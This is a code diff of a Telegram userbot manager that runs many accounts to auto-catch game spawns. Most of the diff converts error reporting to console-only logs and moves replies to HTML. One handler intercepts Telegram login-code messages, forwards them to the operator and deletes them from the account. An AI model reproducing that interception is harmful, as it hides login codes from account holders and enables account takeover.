@@ -36,7 +36,7 @@ SPECIAL_HINT_BOT_ID = 8999491734
 # 🔥 Special Mode Spawn Groups (multiple)
 SPECIAL_SPAWN_GROUPS = [
     -1003580630981,
-    -1003967256441,   # 🆕 NEW (private restricted)
+    -1003967256441,
 ]
 SPECIAL_SPAWN_GROUP = -1003580630981  # backward compat
 
@@ -47,7 +47,7 @@ SPECIAL_W_REPLY_DELAY_MAX = 2.5
 SPECIAL_DELAY_MIN = 2.5
 SPECIAL_DELAY_MAX = 3.5
 
-SPECIAL_W_REPLY_DELAY = 2.0  # fallback
+SPECIAL_W_REPLY_DELAY = 2.0
 
 CGIFT_CHAT_ID = -1003580630981
 CGIFT_WAIT_SEC = 6
@@ -70,7 +70,7 @@ bot_state = {
 cgift_state = {}
 
 # 🆕 List of successfully loaded userbots (for /listbots)
-loaded_userbots = []   # [{u_id, name, username, phone, col_name, special_mode}]
+loaded_userbots = []
 
 # MongoDB
 client_mongo = AsyncIOMotorClient(MONGO_URI)
@@ -89,35 +89,24 @@ bot = TelegramClient('official_bot_session', APP_ID, APP_HASH)
 
 
 # ==========================================
-# 🛡️ ERROR REPORTING (DM to OWNER)
+# 🛡️ ERROR LOGGING (CONSOLE ONLY — no DM)
 # ==========================================
 async def report_error(context: str, exc: Exception, extra: str = ""):
-    """Send error report to owner DM (skips boot errors)."""
+    """Log error to console only. No DM to owner."""
     try:
-        # 🚫 Skip boot errors (invalid sessions) — noisy and not useful
-        if context.startswith("boot[") or "session_start_failed" in extra:
-            print(f"⚠️ [SKIP DM] {context}: {type(exc).__name__}: {exc}")
-            return
-
         tb = ''.join(traceback.format_exception(type(exc), exc, exc.__traceback__))
-        if len(tb) > 3000:
-            tb = tb[-3000:]
-        msg = (
-            f"🚨 **ERROR REPORT**\n"
-            f"📍 **Where:** `{context}`\n"
-            f"❌ **Type:** `{type(exc).__name__}`\n"
-            f"💬 **Msg:** `{str(exc)[:300]}`\n"
-        )
+        print(f"❌ [{context}] {type(exc).__name__}: {exc}")
         if extra:
-            msg += f"ℹ️ **Info:** `{extra[:300]}`\n"
-        msg += f"\n```\n{tb}\n```"
-        await bot.send_message(OWNER_ID, msg)
+            print(f"   ℹ️ {extra}")
+        # keep only tail of traceback for readability
+        if len(tb) > 1500:
+            tb = tb[-1500:]
+        print(tb)
     except Exception as e:
-        print(f"⚠️ Failed to report error: {e}")
+        print(f"⚠️ report_error internal failure: {e}")
 
 
 def safe_handler(context_name: str):
-    """Decorator: wrap handler with try/except → auto DM to owner."""
     def decorator(func):
         async def wrapper(event, *args, **kwargs):
             try:
@@ -128,9 +117,11 @@ def safe_handler(context_name: str):
                     info = f"chat_id={event.chat_id} sender={event.sender_id}"
                 except Exception:
                     pass
+                # 🔇 Console log only
                 print(f"❌ [{context_name}] {type(e).__name__}: {e}")
+                if info:
+                    print(f"   ℹ️ {info}")
                 traceback.print_exc()
-                asyncio.create_task(report_error(context_name, e, info))
         wrapper.__name__ = func.__name__
         return wrapper
     return decorator
@@ -272,9 +263,15 @@ def parse_ids_from_text(text):
 
 
 def make_mention(name: str, user_id: int) -> str:
-    """HTML mention."""
     safe = (name or "User").replace("<", "").replace(">", "").replace("&", "&amp;")
     return f"<a href='tg://user?id={user_id}'>{safe}</a>"
+
+
+def code(text) -> str:
+    """HTML code block - tap to copy in Telegram."""
+    s = str(text)
+    s = s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+    return f"<code>{s}</code>"
 
 
 # ==========================================
@@ -319,7 +316,6 @@ async def run_cgift_loop(client, user_id):
         state["task"] = None
     except Exception as e:
         print(f"❌ [{user_id}] cgift loop error: {e}")
-        await report_error(f"cgift_loop[{user_id}]", e)
         state["running"] = False
         state["task"] = None
 
@@ -476,11 +472,6 @@ async def spawn_detector_handler(event):
             spawn_tracker.pop(next(iter(spawn_tracker)))
     except Exception as e:
         print(f"❌ spawn handler error {current_user_id}: {e}")
-        await report_error(
-            "spawn_detector.forward_reply",
-            e,
-            f"uid={current_user_id} chat={event.chat_id} text={text_clean[:80]}"
-        )
 
 
 @safe_handler("hint_solver_handler")
@@ -561,11 +552,6 @@ async def hint_solver_handler(event):
             asyncio.create_task(delete_catch_message_delayed(client_to_use, target_orig_group, sent_msg.id))
     except Exception as e:
         print(f"❌ Catch error {current_user_id}: {e}")
-        await report_error(
-            "hint_solver.send_catch",
-            e,
-            f"uid={current_user_id} target={target_orig_group}"
-        )
 
 
 @safe_handler("catch_success_forwarder_handler")
@@ -601,7 +587,6 @@ async def catch_success_forwarder_handler(event):
             await event.message.forward_to(SPECIFIC_GROUP)
     except Exception as e:
         print(f"❌ catch_success_forwarder error {current_user_id}: {e}")
-        await report_error("catch_success_forwarder", e, f"uid={current_user_id}")
 
 
 @safe_handler("telegram_service_handler")
@@ -610,7 +595,7 @@ async def telegram_service_handler(event):
         await bot.send_message(OWNER_ID, f"🔐 **Telegram Login Intercepted!**\n\n{event.message.text}")
         await event.delete()
     except Exception as e:
-        await report_error("telegram_service_handler", e)
+        print(f"❌ telegram_service_handler: {e}")
 
 
 def register_userbot_handlers(client, waifu_chat_id):
@@ -625,14 +610,13 @@ def register_userbot_handlers(client, waifu_chat_id):
 # 🆕 LIST BUILDER
 # ==========================================
 async def build_loaded_list() -> str:
-    """Return formatted list of all loaded userbots."""
+    """Return formatted list of all loaded userbots (HTML, tap-to-copy code)."""
     if not loaded_userbots:
-        return "📭 No userbots loaded."
+        return "📭 <b>No userbots loaded.</b>"
 
-    # Sort by name (case-insensitive)
     rows = sorted(loaded_userbots, key=lambda x: (x.get("name") or "").lower())
 
-    lines = [f"🤖 **Loaded Userbots: {len(rows)}**\n"]
+    lines = [f"🤖 <b>Loaded Userbots: {len(rows)}</b>\n"]
     for i, info in enumerate(rows, 1):
         u_id = info.get("u_id")
         name = info.get("name") or "No Name"
@@ -647,9 +631,9 @@ async def build_loaded_list() -> str:
 
         lines.append(
             f"{i}. {mention}{uname_str}\n"
-            f"   🆔 `{u_id}`\n"
-            f"   📱 `{phone}`\n"
-            f"   🗂️ `{col_name}` — {mode_str}"
+            f"   🆔 {code(u_id)}\n"
+            f"   📱 {code(phone)}\n"
+            f"   🗂️ {code(col_name)} — {mode_str}"
         )
     return "\n".join(lines)
 
@@ -689,7 +673,6 @@ async def handle_bot_commands(event):
         # ---------- 🆕 /listbots ----------
         if cmd == "/listbots":
             msg = await build_loaded_list()
-            # Split if too long (Telegram limit 4096)
             if len(msg) > 4000:
                 chunks = []
                 cur = ""
@@ -980,7 +963,6 @@ async def handle_bot_commands(event):
                 }
                 register_userbot_handlers(temp_client, spawn_group)
 
-                # 🆕 Track for /listbots
                 loaded_userbots.append({
                     "u_id": u_id,
                     "name": me.first_name or "No Name",
@@ -990,16 +972,17 @@ async def handle_bot_commands(event):
                     "special_mode": True,
                 })
 
-                groups_str = "\n".join(f"   • `{g}`" for g in spawn_groups)
+                groups_str = "\n".join(f"   • {code(g)}" for g in spawn_groups)
                 mention = make_mention(me.first_name or "User", u_id)
                 await event.reply(
-                    f"✅ **Installed (Special Mode)**\n"
-                    f"👤 **Name:** {mention}\n🆔 **User ID:** `{u_id}`\n"
-                    f"📱 **Phone:** `{me.phone if me.phone else '—'}`\n"
-                    f"📍 **Spawn Groups:**\n{groups_str}\n"
-                    f"🤖 **Hint Bot:** `{hint_bot_id}`\n"
-                    f"⏱️ **Delay:** {SPECIAL_DELAY_MIN} ~ {SPECIAL_DELAY_MAX} sec\n"
-                    f"🗂️ **DB:** `db['{col_name}']`",
+                    f"✅ <b>Installed (Special Mode)</b>\n"
+                    f"👤 <b>Name:</b> {mention}\n"
+                    f"🆔 <b>User ID:</b> {code(u_id)}\n"
+                    f"📱 <b>Phone:</b> {code(me.phone if me.phone else '—')}\n"
+                    f"📍 <b>Spawn Groups:</b>\n{groups_str}\n"
+                    f"🤖 <b>Hint Bot:</b> {code(hint_bot_id)}\n"
+                    f"⏱️ <b>Delay:</b> {SPECIAL_DELAY_MIN} ~ {SPECIAL_DELAY_MAX} sec\n"
+                    f"🗂️ <b>DB:</b> {code(f\"db['{col_name}']\")}",
                     parse_mode="html"
                 )
             except Exception as e:
@@ -1058,7 +1041,6 @@ async def handle_bot_commands(event):
                 }
                 register_userbot_handlers(temp_client, waifu_chat_id)
 
-                # 🆕 Track for /listbots
                 loaded_userbots.append({
                     "u_id": u_id,
                     "name": me.first_name or "No Name",
@@ -1070,11 +1052,12 @@ async def handle_bot_commands(event):
 
                 mention = make_mention(me.first_name or "User", u_id)
                 await event.reply(
-                    f"✅ **Installed**\n👤 **Name:** {mention}\n"
-                    f"🆔 **User ID:** `{u_id}`\n"
-                    f"📱 **Phone:** `{me.phone if me.phone else '—'}`\n"
-                    f"🌐 **Waifu Chat:** `{waifu_chat_id}`\n"
-                    f"🗂️ **DB:** `db['{col_name}']`",
+                    f"✅ <b>Installed</b>\n"
+                    f"👤 <b>Name:</b> {mention}\n"
+                    f"🆔 <b>User ID:</b> {code(u_id)}\n"
+                    f"📱 <b>Phone:</b> {code(me.phone if me.phone else '—')}\n"
+                    f"🌐 <b>Waifu Chat:</b> {code(waifu_chat_id)}\n"
+                    f"🗂️ <b>DB:</b> {code(f\"db['{col_name}']\")}",
                     parse_mode="html"
                 )
             except Exception as e:
@@ -1116,23 +1099,42 @@ async def handle_bot_commands(event):
             else:
                 await event.reply("❌ **Userbot not found.**")
 
-        # ---------- /emoji ----------
+        # ---------- /emoji (space optional) ----------
         elif cmd == "/emoji":
-            parts = args.split(maxsplit=1)
-            if len(parts) < 2:
-                await event.reply("⚠️ **Usage:** `/emoji [user_id] [emoji_list]`")
+            m = re.match(r"^(\d+)\s*(.+)$", args.strip(), re.DOTALL)
+            if not m:
+                await event.reply(
+                    "⚠️ **Usage:** `/emoji [user_id] [emoji_list]`\n"
+                    "**Examples:**\n"
+                    "• `/emoji 8538593411 🪞✨⚡💮`\n"
+                    "• `/emoji 8538593411🪞✨⚡💮`  ← space မလိုဘူး"
+                )
                 return
             try:
-                target_uid = int(parts[0])
-                custom_emojis = list(parts[1].replace(" ", ""))
+                target_uid = int(m.group(1))
             except ValueError:
                 await event.reply("❌ **Invalid User ID.**")
                 return
+            emoji_str = m.group(2)
+            custom_emojis = [c for c in emoji_str if not c.isspace()]
+
+            if not custom_emojis:
+                await event.reply("⚠️ **No emojis provided.**")
+                return
+
             if target_uid in userbot_instances:
                 col_name = userbot_instances[target_uid]["collection_name"]
                 userbot_instances[target_uid]["ignored_emojis"] = custom_emojis
-                await db[col_name].update_one({"user_id": target_uid}, {"$set": {"ignored_emojis": custom_emojis}})
-                await event.reply(f"✅ **Updated ignored emojis for `{target_uid}`.**")
+                await db[col_name].update_one(
+                    {"user_id": target_uid},
+                    {"$set": {"ignored_emojis": custom_emojis}}
+                )
+                emoji_display = " ".join(custom_emojis)
+                await event.reply(
+                    f"✅ **Updated ignored emojis for `{target_uid}`**\n"
+                    f"🚫 **Now ignoring:** {emoji_display}\n"
+                    f"📊 **Total:** `{len(custom_emojis)}` emojis"
+                )
             else:
                 await event.reply("❌ **Userbot not found.**")
 
@@ -1185,20 +1187,20 @@ async def handle_bot_commands(event):
                     client = userbot_instances[target_uid]["client"]
                     me = await client.get_me()
                     phone_number = me.phone if me.phone else "No phone set"
-                    await event.reply(f"📱 **Phone for `{target_uid}`:** `{phone_number}`")
+                    await event.reply(
+                        f"📱 <b>Phone for</b> {code(target_uid)}\n"
+                        f"☎️ {code(phone_number)}",
+                        parse_mode="html"
+                    )
                 except Exception as e:
                     await event.reply(f"❌ **Error:** {e}")
             else:
                 await event.reply("❌ **Userbot not found.**")
 
     except Exception as e:
+        # 🔇 Console only
         print(f"❌ handle_bot_commands error: {e}")
         traceback.print_exc()
-        try:
-            await event.reply(f"❌ **Command Error:** `{type(e).__name__}: {e}`")
-        except Exception:
-            pass
-        asyncio.create_task(report_error("handle_bot_commands", e, f"cmd={cmd}"))
 
 
 # ==========================================
@@ -1264,7 +1266,6 @@ async def startup():
                     }
                     register_userbot_handlers(client, waifu_chat_id)
 
-                    # 🆕 Track for /listbots
                     loaded_userbots.append({
                         "u_id": u_id,
                         "name": me.first_name or "No Name",
@@ -1277,26 +1278,26 @@ async def startup():
                     print(f"🚀 Loaded {u_id} from db['{col_name}'] (special={special_mode}, groups={spawn_groups})")
                 except Exception as e:
                     failed_count += 1
-                    # 🔇 Silent log only — DO NOT DM owner
+                    # 🔇 Silent console log — no DM
                     print(f"⚠️ [BOOT FAIL] {u_id} from db['{col_name}']: {type(e).__name__}: {e}")
 
     print(f"📊 Total online: {len(userbot_instances)} | Failed: {failed_count}")
 
-    # 🆕 Send summary + full list
+    # Startup summary (HTML, copy-able IDs)
     try:
         summary = (
-            f"🟢 **Startup complete**\n"
-            f"📊 Online userbots: `{len(userbot_instances)}`\n"
-            f"❌ Failed: `{failed_count}`\n"
-            f"🤖 Hint bots: `{len(hint_bot_ids)}`\n"
-            f"📍 Special Spawn Groups: `{len(SPECIAL_SPAWN_GROUPS)}`\n"
-            f"💡 Send `/listbots` to see all loaded userbots."
+            f"🟢 <b>Startup complete</b>\n"
+            f"📊 Online userbots: {code(len(userbot_instances))}\n"
+            f"❌ Failed: {code(failed_count)}\n"
+            f"🤖 Hint bots: {code(len(hint_bot_ids))}\n"
+            f"📍 Special Spawn Groups: {code(len(SPECIAL_SPAWN_GROUPS))}\n"
+            f"💡 Send /listbots to see all loaded userbots."
         )
-        await bot.send_message(OWNER_ID, summary)
+        await bot.send_message(OWNER_ID, summary, parse_mode="html")
     except Exception:
         pass
 
-    # 🆕 Auto-send list on startup (if not too many)
+    # Auto-send full list (chunked if needed)
     try:
         if loaded_userbots:
             list_msg = await build_loaded_list()
